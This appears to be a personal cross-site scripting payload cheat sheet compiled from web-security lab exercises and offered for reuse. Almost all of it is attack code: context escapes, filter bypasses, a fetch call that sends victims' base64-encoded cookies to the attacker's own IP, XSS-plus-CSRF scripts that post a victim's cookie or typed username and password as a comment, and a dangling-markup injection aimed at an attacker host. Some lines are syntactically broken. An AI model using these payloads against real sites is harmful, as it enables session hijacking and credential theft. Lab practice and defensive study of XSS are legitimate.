
NOTE: These payloads were developed by me during my time solving the various labs , if you would be using them, you might need to tweak some of it's functions / syntax 





Escaping HTML contexts : 


<a href="javascript:alert(document.domain)">

#in cases where the angle brackets are encoded , you can trigger an event inside an attribute to run your script and gracefully repair it back:
" autofocus onfocus=alert(document.domain) x="

In the case where the context is in a script tag , you can simply close the tag and run your script : 
</script><img src=1 onerror=alert(document.domain)>



Used to Bypass a filter that blocks some tags and attributes , you can use the following payloads to execute your script :

<svg>
	<a>
	<animate attributeName="href" values="javascript:alert(1)"/>
	<text x="12" y="50">
		Click me
	</text> 
</a>
</svg>

In cases were some characters like parenthesis are not allowed, you can use the throw statement with an exception handler 

onerror=alert;throw 1 


### using HTML entity to bypass context : 

&apos;-alert(document.domain)-&apos;

//the apos sequence is an HTML entity representing an aprostrophe or single quote


### TEMPLATE LITERALS  ``

${arbituary_js_code_here}

### SENDING TO YOUR PRIVATE SERVER 
fetch("http://ip_adddress:port/log?cookie=)+btoa(document.cookie)    //btoa() base64 encode the cookie so it can sucessfully pass URL encodings



CHAIN XSS WITH CSRF TO MANIPULATE USERS TO POST THEIR COOKIE ON THE COMMENT SECTION 

document.addEventListener('DOMContentLoaded', function() {

    var token = document.getElementsByName('csrf')[0].value ;

    var data = new FormData()
    data.append('csrf', token)
    data.append('postId', 3)
    
    data.append('comment', document.cookie)
    data.append('name', 'Hacked')
    data.append('email', 'hacked@example.com')
    data.append('website', 'https://hacked.com')


    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
})




### CHAIN XSS WITH CSRF TO GET USERNAME AND PASSWORD 

<input name="username" id="username"/>

<input name="password" name="password" id="password" onchange="pawn()"/>
<script>
function pawn() {

    var user =  document.getElementsByName('username')[0].value;
    var pass =  document.getElementsByName('password')[0].value;
    var token = document.getElementsByName('csrf')[0].value;

    var data = new FormData();

    data.append("csrf", token)
    data.append("postId", 3)
    data.append("comment", `${user} : ${pass}`)
    data.append("name", "hacker")
    data.append("email", "hacker@hacked.com")
    data.append("website", "http://hacker.com")

    fetch("/post/comment", { 
        method: 'POST',
        mode : 'no-cors',
        body : data

    })




}

</script>





### DANGLING MARKUP INJECTIONS 
"><img src='//attacker-website.com?